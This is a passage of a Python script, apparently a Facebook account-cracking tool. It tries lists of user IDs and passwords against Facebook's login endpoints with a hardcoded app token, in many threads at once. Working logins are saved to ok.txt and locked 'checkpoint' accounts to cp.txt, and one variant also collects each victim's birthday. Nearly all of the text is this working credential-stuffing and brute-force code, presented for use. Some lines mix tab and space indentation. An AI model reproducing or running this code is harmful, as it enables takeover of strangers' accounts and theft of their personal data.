					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print ("   %s"%e)
				print(k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n")
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print("\n\x1b[0;37m[•] Finished")
				results(self.ada,self.cp)
                                exit()
				break
	def pwlist(self):
		self.pw=raw_input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print(k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n")
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			results(self.ada,self.cp)
			print("\n\x1b[0;37m[•] Finished")
                        exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=m_fb(fl.get("id"),
					i,"https://m.facebook.com")
				if log.get("status")=="success":
					print("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="cp":
					print("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s               "%(fl.get("id"),i))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r\x1b[0;37m[Crack] %s/%s | OK : %s | CP : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)

class bapi:
  def __init__(self):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah()
  def krah(self):
    print(k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [d/m]")
    while True:
      f=raw_input(k+"["+p+"•"+k+"]"+p+" Choose : ")
      if f in[""," "]:
        print(k+"["+p+"!"+k+"]"+p+" Invalid Number")
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=raw_input(k+"["+p+"•"+k+"]"+p+" ID List File : ")
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(k+"["+p+"!"+k+"]"+p+" %s"%e)
              continue
          self.fl=[]
          print (k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456")
          self.pw=raw_input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print(k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n")
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        results(self.ok,self.cp)
        print("\n\x1b[0;37m[•] Finished")
        exit()
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=raw_input(k+"["+p+"•"+k+"]"+p+" ID List File : ")
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print(k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n")
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        print("\n\x1b[0;37m[•] Finished")
        results(self.ok,self.cp)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s %s               "%(username,password,N))
      ok.append(username + " • " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        self.cp.append(username + " • " + password)
        print("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s %s               "%(username,password,N))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + "\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print("\r\x1b[0;37m[Crack] %s/%s | OK : %s | CP : %s"%(self.loop,len(self.fl),len(self.ok),len(self.cp))),;sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print("\r\x1b[0;37m[Crack] %s/%s | OK : %s | CP : %s"%(self.loop,len(self.fl),len(self.ok),len(self.cp))),;sys.stdout.flush()

class bapittl:
  def __init__(self):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah()
  def krah(self):
    print(k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [d/m]")
    while True:
      f=raw_input(k+"["+p+"•"+k+"]"+p+" Choose : ")
      if f in[""," "]:
        print(k+"["+p+"!"+k+"]"+p+" Invalid Number")
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=raw_input(k+"["+p+"•"+k+"]"+p+" ID List File : ")
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(k+"["+p+"!"+k+"]"+p+" %s"%e)
              continue
          self.fl=[]
          print (k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456")
          self.pw=raw_input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print(k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n")
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        results(self.ok,self.cp)
        print("\n\x1b[0;37m[•] Finished")
        exit()
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=raw_input(k+"["+p+"•"+k+"]"+p+" ID List File : ")
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print(k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n")
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        print("\n\x1b[0;37m[•] Finished")
        results(self.ok,self.cp)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s %s               "%(username,password,N))
      ok.append(username + " • " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        try:
          ke=requests.get("https://graph.facebook.com/"+str(username)+"?access_token="+open("login.txt","r").read())
          tt=json.loads(ke.text)
          ttl=tt["birthday"]
        except:pass
        self.cp.append(username + " • " + password + " • " + ttl)
        print("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s • %s\x1b[0m   "%(username,password,ttl))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + " • "+ str(ttl)+"\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print("\r\x1b[0;37m[Crack] %s/%s | OK : %s | CP : %s"%(self.loop,len(self.fl),len(self.ok),len(self.cp))),;sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print("\r\x1b[0;37m[Crack] %s/%s | OK : %s | CP : %s"%(self.loop,len(self.fl),len(self.ok),len(self.cp))),;sys.stdout.flush()

### RESULT ###

def results(Dapunta,Krahkrah):
        if len(Dapunta) !=0:
                print ("[OK] : "+str(len(Dapunta)))
        if len(Krahkrah) !=0:
                print ("[CP] : "+str(len(Krahkrah)))
        if len(Dapunta) ==0 and len(Krahkrah) ==0:
                print "\n"
                print (k+"["+p+"!"+k+"]"+p+" No Result Found")

def ress():
    os.system("clear")
    banner()
    print(k+"\n[ "+p+"Result Crack"+k+" ]"+p)
    print(k+"\n[ "+p+"OK"+k+" ]"+p)
    try:
        os.system("cat ok.txt")
    except IOError:
        print(k+"["+p+"!"+k+"]"+p+" No Result Found")
    (k+"\n[ "+p+"CP"+k+" ]"+p)
    try:
        os.system("cat cp.txt")
    except IOError:
        print(k+"["+p+"!"+k+"]"+p+" No Result Found")
    raw_input(k+"\n[ "+p+"Back"+k+" ]"+p)
    menu()

def updatesc():
        os.system("clear")
	banner()
	print(k+"\n["+p+"•"+k+"]"+p+" Updating Script")
	os.system("git pull origin master")
        print(k+"\n["+p+"•"+k+"]"+p+" Update Successful")
	exit()

def wangsaff():
    os.system("clear")
    banner()
    raw_input("\n[ Contact Dapunta? ]")
    jalan(k+"["+p+"•"+k+"]"+p+" Open Whatsapp...")
    os.system("xdg-open https://wa.me/+6282245780524?text=Assalamualaikum%20Bang,%20Saya%20Pengguna%20SC%20SBF%20Dapunta.%20Code:%20404")
    raw_input(k+"\n[ "+p+"Back"+k+" ]"+p)
    menu()

if __name__=="__main__":
	menu()
